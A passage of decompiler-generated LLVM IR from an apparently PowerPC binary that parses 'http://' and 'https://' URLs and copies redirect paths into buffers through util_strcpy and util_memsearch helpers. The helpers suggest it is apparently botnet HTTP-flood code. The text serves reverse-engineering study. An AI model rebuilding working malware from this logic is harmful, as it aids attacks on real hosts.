  store i32 %v3_10002094, i32* %r4.global-to-local, align 4
  %v0_10002098 = load i32, i32* @r27, align 4
  %v2_10002098 = add i32 %v0_10002098, %v4_1000208c
  store i32 %v2_10002098, i32* %r31.global-to-local, align 4
  %v3_1000209c = load i32, i32* inttoptr (i32 268501124 to i32*), align 4
  store i32 %v4_1000208c, i32* %r29.global-to-local, align 4
  %v2_100020a4 = sub i32 %v3_10002094, %v4_1000208c
  store i32 %v2_100020a4, i32* %r4.global-to-local, align 4
  store i32 %v2_10002098, i32* %r3.global-to-local, align 4
  %v4_100020b0 = call i32 @util_memsearch(i32 %v2_10002098, i32 %v2_100020a4, i32 %v3_1000209c, i32 1)
  store i32 %v4_100020b0, i32* %r3.global-to-local, align 4
  %v0_100020b4 = load i32, i32* @r30, align 4
  %v1_100020b4 = add i32 %v0_100020b4, 1468
  %v2_100020b4 = inttoptr i32 %v1_100020b4 to i32*
  %v3_100020b4 = load i32, i32* %v2_100020b4, align 4
  store i32 %v3_100020b4, i32* %r0.global-to-local, align 4
  %v1_100020b8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100020b8 = add i32 %v1_100020b8, %v4_100020b0
  store i32 %v2_100020b8, i32* %r28.global-to-local, align 4
  %v1_100020bc = icmp slt i32 %v3_100020b4, 4
  %v3_100020bc = icmp eq i32 %v3_100020b4, 4
  store i1 %v1_100020bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100020bc, i1* %cr7_eq.global-to-local, align 1
  %v2_100020c0 = add i32 %v2_100020b8, %v0_100020b4
  store i32 %v2_100020c0, i32* %r9.global-to-local, align 4
  %v0_100020c4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100020c4 = trunc i32 %v0_100020c4 to i8
  %v3_100020c4 = add i32 %v2_100020c0, 2115
  %v4_100020c4 = inttoptr i32 %v3_100020c4 to i8*
  store i8 %v1_100020c4, i8* %v4_100020c4, align 1
  %v0_100020c8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_100020c8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_100020c8 = or i1 %v0_100020c8, %v1_100020c8
  br i1 %v2_100020c8, label %dec_label_pc_10002204, label %dec_label_pc_100020cc

dec_label_pc_100020cc:                            ; preds = %dec_label_pc_10002204, %dec_label_pc_10002068, %dec_label_pc_10002214
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r9.global-to-local, align 4
  %v1_100020d4 = load i32, i32* @r30, align 4
  %v2_100020d4 = add i32 %v1_100020d4, 1464
  %v3_100020d4 = inttoptr i32 %v2_100020d4 to i32*
  store i32 -1, i32* %v3_100020d4, align 4
  %v0_100020d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100020d8 = trunc i32 %v0_100020d8 to i8
  %v2_100020d8 = load i32, i32* @r30, align 4
  %v3_100020d8 = add i32 %v2_100020d8, 4
  %v4_100020d8 = inttoptr i32 %v3_100020d8 to i8*
  store i8 %v1_100020d8, i8* %v4_100020d8, align 1
  br label %dec_label_pc_10001038

dec_label_pc_100020e0:                            ; preds = %dec_label_pc_10001c20
  store i32 7, i32* %r4.global-to-local, align 4
  store i32 7, i32* %stack_var_-20888, align 4
  %v0_100020e8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100020e8 = add i32 %v0_100020e8, 4
  %v2_100020e8 = inttoptr i32 %v1_100020e8 to i8*
  %v3_100020e8 = load i8, i8* %v2_100020e8, align 1
  %v4_100020e8 = zext i8 %v3_100020e8 to i32
  store i32 %v4_100020e8, i32* %r0.global-to-local, align 4
  %v1_100020ec = icmp ult i8 %v3_100020e8, 115
  %v3_100020ec = icmp eq i8 %v3_100020e8, 115
  store i1 %v1_100020ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100020ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100020ec, label %dec_label_pc_100022d0, label %dec_label_pc_100020f4

dec_label_pc_100020f4:                            ; preds = %dec_label_pc_100020e0, %dec_label_pc_100022d0
  %v0_100020f4 = phi i32 [ 7, %dec_label_pc_100020e0 ], [ 8, %dec_label_pc_100022d0 ]
  %v1_100020f4 = load i32, i32* %r28.global-to-local, align 4
  %v2_100020f4 = sub i32 %v1_100020f4, %v0_100020f4
  store i32 %v0_100020e8, i32* %r3.global-to-local, align 4
  %v2_100020fc = add i32 %v0_100020f4, %v0_100020e8
  store i32 %v2_100020fc, i32* %r4.global-to-local, align 4
  store i32 268443908, i32* @lr, align 4
  %v3_10002100 = call i32 @memmove(i32 %v0_100020e8, i32 %v2_100020fc, i32 %v2_100020f4)
  store i32 %v3_10002100, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-20888, align 4
  %v0_1000210c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000210c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000210c = add i32 %v1_1000210c, %v0_1000210c
  %v3_1000210c = inttoptr i32 %v2_1000210c to i8*
  %v4_1000210c = load i8, i8* %v3_1000210c, align 1
  %v5_1000210c = zext i8 %v4_1000210c to i32
  store i32 %v5_1000210c, i32* %r3.global-to-local, align 4
  %v3_10002110 = icmp eq i8 %v4_1000210c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002110, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002110, label %dec_label_pc_1000214c, label %dec_label_pc_10002118

dec_label_pc_10002118:                            ; preds = %dec_label_pc_100020f4
  %v1_10002118 = icmp ult i8 %v4_1000210c, 47
  %v3_10002118 = icmp eq i8 %v4_1000210c, 47
  store i1 %v1_10002118, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002118, i1* %cr7_eq.global-to-local, align 1
  %v0_1000211c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000211c, i32* %r9.global-to-local, align 4
  br i1 %v3_10002118, label %dec_label_pc_100022bc, label %dec_label_pc_10002124

dec_label_pc_10002124:                            ; preds = %dec_label_pc_10002118
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10002134

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_10002134
  %v1_1000212c = icmp ult i8 %v4_10002140, 47
  %v3_1000212c = icmp eq i8 %v4_10002140, 47
  store i1 %v1_1000212c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000212c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000212c, label %dec_label_pc_100022bc, label %dec_label_pc_10002134

dec_label_pc_10002134:                            ; preds = %dec_label_pc_1000212c, %dec_label_pc_10002124
  %v0_10002134 = phi i32 [ %v1_10002134, %dec_label_pc_1000212c ], [ 0, %dec_label_pc_10002124 ]
  %v1_10002134 = add i32 %v0_10002134, 1
  store i32 %v1_10002134, i32* %r4.global-to-local, align 4
  store i32 %v1_10002134, i32* %stack_var_-20888, align 4
  %v2_1000213c = add i32 %v1_10002134, %v0_1000211c
  store i32 %v2_1000213c, i32* %r9.global-to-local, align 4
  %v3_10002140 = inttoptr i32 %v2_1000213c to i8*
  %v4_10002140 = load i8, i8* %v3_10002140, align 1
  %v5_10002140 = zext i8 %v4_10002140 to i32
  store i32 %v5_10002140, i32* %r0.global-to-local, align 4
  %v3_10002144 = icmp eq i8 %v4_10002140, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002144, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002144, label %dec_label_pc_1000214c, label %dec_label_pc_1000212c

dec_label_pc_1000214c:                            ; preds = %dec_label_pc_10002134, %dec_label_pc_100020f4, %dec_label_pc_100022bc
  %v0_1000214c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000214c, i32* %r3.global-to-local, align 4
  store i32 268443988, i32* @lr, align 4
  %v1_10002150 = inttoptr i32 %v0_1000214c to i8*
  %v2_10002150 = call i32 @util_strlen(i8* %v1_10002150)
  store i32 %v2_10002150, i32* %r3.global-to-local, align 4
  %v1_10002154 = icmp slt i32 %v2_10002150, 0
  %v3_10002154 = icmp eq i32 %v2_10002150, 0
  store i1 %v1_10002154, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002154, i1* %cr7_eq.global-to-local, align 1
  %tmp133 = icmp slt i32 %v2_10002150, 1
  br i1 %tmp133, label %dec_label_pc_10002178, label %dec_label_pc_1000215c

dec_label_pc_1000215c:                            ; preds = %dec_label_pc_1000214c
  %v0_1000215c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000215c, i32* %r3.global-to-local, align 4
  store i32 268444004, i32* @lr, align 4
  %v1_10002160 = inttoptr i32 %v0_1000215c to i8*
  %v2_10002160 = call i32 @util_strlen(i8* %v1_10002160)
  store i32 %v2_10002160, i32* %r3.global-to-local, align 4
  %v1_10002164 = icmp slt i32 %v2_10002160, 127
  %v2_10002164 = icmp sgt i32 %v2_10002160, 127
  %v3_10002164 = icmp eq i32 %v2_10002160, 127
  store i1 %v1_10002164, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002164, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10002164, label %dec_label_pc_10002178, label %dec_label_pc_1000216c

dec_label_pc_1000216c:                            ; preds = %dec_label_pc_1000215c
  %v0_1000216c = load i32, i32* @r30, align 4
  %v1_1000216c = add i32 %v0_1000216c, 789
  store i32 %v1_1000216c, i32* @r3, align 4
  %v0_10002170 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10002170, i32* %r4.global-to-local, align 4
  %v2_10002174 = inttoptr i32 %v1_1000216c to i8*
  %v3_10002174 = call i32 @util_strcpy(i8* %v2_10002174, i32 %v0_10002170)
  store i32 %v3_10002174, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002178

dec_label_pc_10002178:                            ; preds = %dec_label_pc_1000215c, %dec_label_pc_1000214c, %dec_label_pc_1000216c
  %v3_10002178 = load i32, i32* %stack_var_-20888, align 4
  %v0_1000217c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000217c = add i32 %v0_1000217c, 1
  store i32 %v1_1000217c, i32* %r31.global-to-local, align 4
  %v2_10002180 = add i32 %v1_1000217c, %v3_10002178
  store i32 %v2_10002180, i32* %r3.global-to-local, align 4
  store i32 268444040, i32* @lr, align 4
  %v1_10002184 = inttoptr i32 %v2_10002180 to i8*
  %v2_10002184 = call i32 @util_strlen(i8* %v1_10002184)
  store i32 %v2_10002184, i32* %r3.global-to-local, align 4
  %v1_10002188 = icmp slt i32 %v2_10002184, 255
  %v2_10002188 = icmp sgt i32 %v2_10002184, 255
  %v3_10002188 = icmp eq i32 %v2_10002184, 255
  store i1 %v1_10002188, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002188, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10002188, label %dec_label_pc_10001c60, label %dec_label_pc_10002190

dec_label_pc_10002190:                            ; preds = %dec_label_pc_10002178
  %v0_10002190 = load i32, i32* @r30, align 4
  %v1_10002190 = add i32 %v0_10002190, 533
  store i32 %v1_10002190, i32* %r29.global-to-local, align 4
  store i32 255, i32* @r4, align 4
  store i32 %v1_10002190, i32* @r3, align 4
  store i32 268444064, i32* @lr, align 4
  %v0_1000219c = call i32 @util_zero()
  %v3_100021a0 = load i32, i32* %stack_var_-20888, align 4
  %v0_100021a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100021a4 = add i32 %v0_100021a4, %v3_100021a0
  store i32 %v2_100021a4, i32* %r3.global-to-local, align 4
  store i32 268444076, i32* @lr, align 4
  %v1_100021a8 = inttoptr i32 %v2_100021a4 to i8*
  %v2_100021a8 = call i32 @util_strlen(i8* %v1_100021a8)
  store i32 %v2_100021a8, i32* %r3.global-to-local, align 4
  %v1_100021ac = icmp slt i32 %v2_100021a8, 0
  %v3_100021ac = icmp eq i32 %v2_100021a8, 0
  store i1 %v1_100021ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100021ac, i1* %cr7_eq.global-to-local, align 1
  %tmp134 = icmp slt i32 %v2_100021a8, 1
  br i1 %tmp134, label %dec_label_pc_10001c60, label %dec_label_pc_100021b4

dec_label_pc_100021b4:                            ; preds = %dec_label_pc_10002190
  %v3_100021b4 = load i32, i32* %stack_var_-20888, align 4
  %v0_100021b8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100021b8, i32* @r3, align 4
  %v0_100021bc = load i32, i32* %r31.global-to-local, align 4
  %v2_100021bc = add i32 %v0_100021bc, %v3_100021b4
  store i32 %v2_100021bc, i32* %r4.global-to-local, align 4
  %v2_100021c0 = inttoptr i32 %v0_100021b8 to i8*
  %v3_100021c0 = call i32 @util_strcpy(i8* %v2_100021c0, i32 %v2_100021bc)
  store i32 %v3_100021c0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100021c8 = load i32, i32* @r30, align 4
  %v3_100021c8 = add i32 %v2_100021c8, 4
  %v4_100021c8 = inttoptr i32 %v3_100021c8 to i8*
  store i8 1, i8* %v4_100021c8, align 1
  br label %dec_label_pc_10001038

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_10001fec
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_100021d4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100021d4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100100cc.16 to i32), i32* %r4.global-to-local, align 4
  %v3_100021dc = inttoptr i32 %v0_100021d4 to i8*
  %v4_100021dc = call i32 @util_strcmp(i8* %v3_100021dc, i32 ptrtoint ([4 x i8]* @global_var_100100cc.16 to i32))
  store i32 %v4_100021dc, i32* %r3.global-to-local, align 4
  %v1_100021e0 = icmp slt i32 %v4_100021dc, 0
  %v3_100021e0 = icmp eq i32 %v4_100021dc, 0
  store i1 %v1_100021e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100021e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100021e0, label %dec_label_pc_100021e8, label %dec_label_pc_10002024

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021d0
  %v0_100021e8 = load i32, i32* %r25.global-to-local, align 4
  %v1_100021e8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100021e8 = icmp slt i32 %v0_100021e8, %v1_100021e8
  %v3_100021e8 = icmp sgt i32 %v0_100021e8, %v1_100021e8
  %v4_100021e8 = icmp eq i32 %v0_100021e8, %v1_100021e8
  store i1 %v2_100021e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100021e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100021e8, label %dec_label_pc_100021f0, label %dec_label_pc_10002360

dec_label_pc_100021f0:                            ; preds = %dec_label_pc_100021e8
  store i32 10, i32* %r0.global-to-local, align 4
  %v2_100021f4 = load i32, i32* @r30, align 4
  %v3_100021f4 = add i32 %v2_100021f4, 4
  %v4_100021f4 = inttoptr i32 %v3_100021f4 to i8*
  store i8 10, i8* %v4_100021f4, align 1
  br label %dec_label_pc_1000202c

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_100016f8
  %v0_100021fc = load i32, i32* %r29.global-to-local, align 4
  %v1_100021fc = trunc i32 %v0_100021fc to i8
  %v2_100021fc = load i32, i32* @r30, align 4
  %v3_100021fc = add i32 %v2_100021fc, 4
  %v4_100021fc = inttoptr i32 %v3_100021fc to i8*
  store i8 %v1_100021fc, i8* %v4_100021fc, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10002204:                            ; preds = %dec_label_pc_10002068
  %v0_10002204 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002204, i32* %r3.global-to-local, align 4
  store i32 268444172, i32* @lr, align 4
  %v1_10002208 = inttoptr i32 %v0_10002204 to i8*
  %v2_10002208 = call i32 @util_strlen(i8* %v1_10002208)
  store i32 %v2_10002208, i32* %r3.global-to-local, align 4
  %v1_1000220c = icmp slt i32 %v2_10002208, 127
  %v2_1000220c = icmp sgt i32 %v2_10002208, 127
  %v3_1000220c = icmp eq i32 %v2_10002208, 127
  store i1 %v1_1000220c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000220c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000220c, label %dec_label_pc_100020cc, label %dec_label_pc_10002214

dec_label_pc_10002214:                            ; preds = %dec_label_pc_10002204
  %v0_10002214 = load i32, i32* @r30, align 4
  %v1_10002214 = add i32 %v0_10002214, 1468
  %v2_10002214 = inttoptr i32 %v1_10002214 to i32*
  %v3_10002214 = load i32, i32* %v2_10002214, align 4
  %v0_10002218 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002218, i32* %r4.global-to-local, align 4
  %v0_1000221c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000221c = add i32 %v0_1000221c, 3
  store i32 %v1_1000221c, i32* %r28.global-to-local, align 4
  %v1_10002220 = mul i32 %v3_10002214, 128
  %v0_10002224 = load i32, i32* @r27, align 4
  %v2_10002224 = add i32 %v0_10002224, %v1_1000221c
  store i32 %v2_10002224, i32* %r27.global-to-local, align 4
  %v1_10002228 = add i32 %v0_10002214, 1472
  %v2_1000222c = add i32 %v1_10002228, %v1_10002220
  store i32 %v2_1000222c, i32* @r3, align 4
  %v2_10002230 = inttoptr i32 %v2_1000222c to i8*
  %v3_10002230 = call i32 @util_strcpy(i8* %v2_10002230, i32 %v0_10002218)
  store i32 %v3_10002230, i32* %r3.global-to-local, align 4
  %v0_10002234 = load i32, i32* @r30, align 4
  %v1_10002234 = add i32 %v0_10002234, 1468
  %v2_10002234 = inttoptr i32 %v1_10002234 to i32*
  %v3_10002234 = load i32, i32* %v2_10002234, align 4
  %v1_10002238 = mul i32 %v3_10002234, 128
  %v1_1000223c = add i32 %v0_10002234, 1472
  %v2_10002240 = add i32 %v1_1000223c, %v1_10002238
  store i32 %v2_10002240, i32* %r29.global-to-local, align 4
  store i32 %v2_10002240, i32* %r3.global-to-local, align 4
  store i32 268444236, i32* @lr, align 4
  %v1_10002248 = inttoptr i32 %v2_10002240 to i8*
  %v2_10002248 = call i32 @util_strlen(i8* %v1_10002248)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100104b8.25 to i32), i32* %r4.global-to-local, align 4
  %v0_10002254 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002254 = add i32 %v0_10002254, %v2_10002248
  store i32 %v2_10002254, i32* @r3, align 4
  %v2_10002258 = inttoptr i32 %v2_10002254 to i8*
  %v3_10002258 = call i32 @util_strcpy(i8* %v2_10002258, i32 ptrtoint (i32* @global_var_100104b8.25 to i32))
  store i32 %v3_10002258, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10002260 = load i32, i32* @r30, align 4
  %v1_10002260 = add i32 %v0_10002260, 2112
  %v2_10002260 = inttoptr i32 %v1_10002260 to i32*
  %v3_10002260 = load i32, i32* %v2_10002260, align 4
  %v0_1000226c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000226c, i32* %r3.global-to-local, align 4
  %v0_10002270 = load i32, i32* %r28.global-to-local, align 4
  %v2_10002270 = sub i32 %v3_10002260, %v0_10002270
  store i32 %v2_10002270, i32* %r4.global-to-local, align 4
  %v4_10002274 = call i32 @util_memsearch(i32 %v0_1000226c, i32 %v2_10002270, i32 %v3_10002268, i32 1)
  store i32 %v4_10002274, i32* %r3.global-to-local, align 4
  %v0_10002278 = load i32, i32* @r30, align 4
  %v1_10002278 = add i32 %v0_10002278, 1468
  %v2_10002278 = inttoptr i32 %v1_10002278 to i32*
  %v3_10002278 = load i32, i32* %v2_10002278, align 4
  %v0_1000227c = load i32, i32* %r28.global-to-local, align 4
  %v1_10002280 = mul i32 %v3_10002278, 128
  %v2_1000227c = add i32 %v0_10002278, %v4_10002274
  %v2_10002284 = add i32 %v2_1000227c, %v0_1000227c
  %v1_1000228c = add i32 %v2_10002284, 2111
  store i32 %v1_1000228c, i32* %r28.global-to-local, align 4
  %v1_10002288 = add i32 %v0_10002278, 1472
  %v2_10002290 = add i32 %v1_10002288, %v1_10002280
  store i32 %v2_10002290, i32* %r29.global-to-local, align 4
  %v0_10002294 = load i32, i32* %r26.global-to-local, align 4
  %v1_10002294 = trunc i32 %v0_10002294 to i8
  %v3_10002294 = add i32 %v2_10002284, 2115
  %v4_10002294 = inttoptr i32 %v3_10002294 to i8*
  store i8 %v1_10002294, i8* %v4_10002294, align 1
  %v0_10002298 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10002298, i32* %r3.global-to-local, align 4
  store i32 268444320, i32* @lr, align 4
  %v1_1000229c = inttoptr i32 %v0_10002298 to i8*
  %v2_1000229c = call i32 @util_strlen(i8* %v1_1000229c)
  %v0_100022a0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100022a0, i32* %r4.global-to-local, align 4
  %v0_100022a4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100022a4 = add i32 %v0_100022a4, %v2_1000229c
  store i32 %v2_100022a4, i32* @r3, align 4
  %v2_100022a8 = inttoptr i32 %v2_100022a4 to i8*
  %v3_100022a8 = call i32 @util_strcpy(i8* %v2_100022a8, i32 %v0_100022a0)
  store i32 %v3_100022a8, i32* %r3.global-to-local, align 4
  %v0_100022ac = load i32, i32* @r30, align 4
  %v1_100022ac = add i32 %v0_100022ac, 1468
  %v2_100022ac = inttoptr i32 %v1_100022ac to i32*
  %v3_100022ac = load i32, i32* %v2_100022ac, align 4
  %v1_100022b0 = add i32 %v3_100022ac, 1
  store i32 %v1_100022b0, i32* %r9.global-to-local, align 4
  store i32 %v1_100022b0, i32* %v2_100022ac, align 4
  br label %dec_label_pc_100020cc

dec_label_pc_100022bc:                            ; preds = %dec_label_pc_1000212c, %dec_label_pc_10002118
  %v2_100022c0 = phi i32 [ %v0_1000211c, %dec_label_pc_10002118 ], [ %v2_1000213c, %dec_label_pc_1000212c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100022c0 = inttoptr i32 %v2_100022c0 to i8*
  store i8 0, i8* %v3_100022c0, align 1
  br label %dec_label_pc_1000214c

dec_label_pc_100022c8:                            ; preds = %dec_label_pc_10001ef8
  store i32 %v3_100022c8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001f50

dec_label_pc_100022d0:                            ; preds = %dec_label_pc_100020e0
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 8, i32* %stack_var_-20888, align 4
  br label %dec_label_pc_100020f4

dec_label_pc_100022dc:                            ; preds = %dec_label_pc_100023d4, %dec_label_pc_100023c0
  %v2_100022e0 = phi i32 [ %v0_100023c4, %dec_label_pc_100023c0 ], [ %v2_100023e4, %dec_label_pc_100023d4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100022e0 = inttoptr i32 %v2_100022e0 to i8*
  store i8 0, i8* %v3_100022e0, align 1
  br label %dec_label_pc_100022e4

dec_label_pc_100022e4:                            ; preds = %dec_label_pc_100023dc, %dec_label_pc_10002394, %dec_label_pc_100022dc
  %v0_100022e4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100022e4, i32* %r3.global-to-local, align 4
  store i32 268444396, i32* @lr, align 4
  %v1_100022e8 = inttoptr i32 %v0_100022e4 to i8*
  %v2_100022e8 = call i32 @util_strlen(i8* %v1_100022e8)
  store i32 %v2_100022e8, i32* %r3.global-to-local, align 4
  %v1_100022ec = icmp slt i32 %v2_100022e8, 0
  %v3_100022ec = icmp eq i32 %v2_100022e8, 0
  store i1 %v1_100022ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100022ec, i1* %cr7_eq.global-to-local, align 1
  %tmp135 = icmp slt i32 %v2_100022e8, 1
  br i1 %tmp135, label %dec_label_pc_10002310, label %dec_label_pc_100022f4

dec_label_pc_100022f4:                            ; preds = %dec_label_pc_100022e4
  %v0_100022f4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100022f4, i32* %r3.global-to-local, align 4
  store i32 268444412, i32* @lr, align 4
  %v1_100022f8 = inttoptr i32 %v0_100022f4 to i8*
  %v2_100022f8 = call i32 @util_strlen(i8* %v1_100022f8)
  store i32 %v2_100022f8, i32* %r3.global-to-local, align 4
  %v1_100022fc = icmp slt i32 %v2_100022f8, 127
  %v2_100022fc = icmp sgt i32 %v2_100022f8, 127
  %v3_100022fc = icmp eq i32 %v2_100022f8, 127
  store i1 %v1_100022fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100022fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100022fc, label %dec_label_pc_10002310, label %dec_label_pc_10002304

dec_label_pc_10002304:                            ; preds = %dec_label_pc_100022f4
  %v0_10002304 = load i32, i32* @r30, align 4
  %v1_10002304 = add i32 %v0_10002304, 789
  store i32 %v1_10002304, i32* @r3, align 4
  %v0_10002308 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002308, i32* %r4.global-to-local, align 4
  %v2_1000230c = inttoptr i32 %v1_10002304 to i8*
  %v3_1000230c = call i32 @util_strcpy(i8* %v2_1000230c, i32 %v0_10002308)
  store i32 %v3_1000230c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002310

dec_label_pc_10002310:                            ; preds = %dec_label_pc_100022f4, %dec_label_pc_100022e4, %dec_label_pc_10001fc0, %dec_label_pc_10002304
  %v3_10002310 = load i32, i32* %stack_var_-20888, align 4
  %v0_10002314 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002314 = add i32 %v0_10002314, 1
  store i32 %v1_10002314, i32* %r31.global-to-local, align 4
  %v2_10002318 = add i32 %v1_10002314, %v3_10002310
  store i32 %v2_10002318, i32* %r3.global-to-local, align 4
  store i32 268444448, i32* @lr, align 4
  %v1_1000231c = inttoptr i32 %v2_10002318 to i8*
  %v2_1000231c = call i32 @util_strlen(i8* %v1_1000231c)
  store i32 %v2_1000231c, i32* %r3.global-to-local, align 4
  %v1_10002320 = icmp slt i32 %v2_1000231c, 255
  %v2_10002320 = icmp sgt i32 %v2_1000231c, 255
  %v3_10002320 = icmp eq i32 %v2_1000231c, 255
  store i1 %v1_10002320, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002320, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10002320, label %dec_label_pc_10001fcc, label %dec_label_pc_10002328

dec_label_pc_10002328:                            ; preds = %dec_label_pc_10002310
  %v0_10002328 = load i32, i32* @r30, align 4
  %v1_10002328 = add i32 %v0_10002328, 533
  store i32 %v1_10002328, i32* %r29.global-to-local, align 4
  store i32 255, i32* @r4, align 4
  store i32 %v1_10002328, i32* @r3, align 4
  store i32 268444472, i32* @lr, align 4
  %v0_10002334 = call i32 @util_zero()
  %v3_10002338 = load i32, i32* %stack_var_-20888, align 4
  %v0_1000233c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000233c = add i32 %v0_1000233c, %v3_10002338
  store i32 %v2_1000233c, i32* %r3.global-to-local, align 4
  store i32 268444484, i32* @lr, align 4
  %v1_10002340 = inttoptr i32 %v2_1000233c to i8*
  %v2_10002340 = call i32 @util_strlen(i8* %v1_10002340)
  store i32 %v2_10002340, i32* %r3.global-to-local, align 4
  %v1_10002344 = icmp slt i32 %v2_10002340, 0
  %v3_10002344 = icmp eq i32 %v2_10002340, 0
  store i1 %v1_10002344, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002344, i1* %cr7_eq.global-to-local, align 1
  %tmp136 = icmp slt i32 %v2_10002340, 1
  br i1 %tmp136, label %dec_label_pc_10001fcc, label %dec_label_pc_1000234c

dec_label_pc_1000234c:                            ; preds = %dec_label_pc_10002328
  %v3_1000234c = load i32, i32* %stack_var_-20888, align 4
  %v0_10002350 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10002350, i32* @r3, align 4
  %v0_10002354 = load i32, i32* %r31.global-to-local, align 4
  %v2_10002354 = add i32 %v0_10002354, %v3_1000234c
  store i32 %v2_10002354, i32* %r4.global-to-local, align 4
  %v2_10002358 = inttoptr i32 %v0_10002350 to i8*
  %v3_10002358 = call i32 @util_strcpy(i8* %v2_10002358, i32 %v2_10002354)
  store i32 %v3_10002358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001fcc

dec_label_pc_10002360:                            ; preds = %dec_label_pc_100021e8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10002364 = load i32, i32* @r30, align 4
  %v3_10002364 = add i32 %v2_10002364, 4
  %v4_10002364 = inttoptr i32 %v3_10002364 to i8*
  store i8 1, i8* %v4_10002364, align 1
  br label %dec_label_pc_1000202c

dec_label_pc_1000236c:                            ; preds = %dec_label_pc_10001ed8
  %v1_1000236c = add i32 %v3_10001ee0, 2
  store i32 %v1_1000236c, i32* %r4.global-to-local, align 4
  store i32 %v1_1000236c, i32* %stack_var_-20888, align 4
  br label %dec_label_pc_10001ef8

dec_label_pc_10002378:                            ; preds = %dec_label_pc_10001f94
  store i32 7, i32* %r4.global-to-local, align 4
  store i32 7, i32* %stack_var_-20888, align 4
  %v0_10002380 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002380 = add i32 %v0_10002380, 4
  %v2_10002380 = inttoptr i32 %v1_10002380 to i8*
  %v3_10002380 = load i8, i8* %v2_10002380, align 1
  %v4_10002380 = zext i8 %v3_10002380 to i32
  store i32 %v4_10002380, i32* %r0.global-to-local, align 4
  %v1_10002384 = icmp ult i8 %v3_10002380, 115
  %v3_10002384 = icmp eq i8 %v3_10002380, 115
  store i1 %v1_10002384, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002384, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002384, label %dec_label_pc_1000238c, label %dec_label_pc_10002394

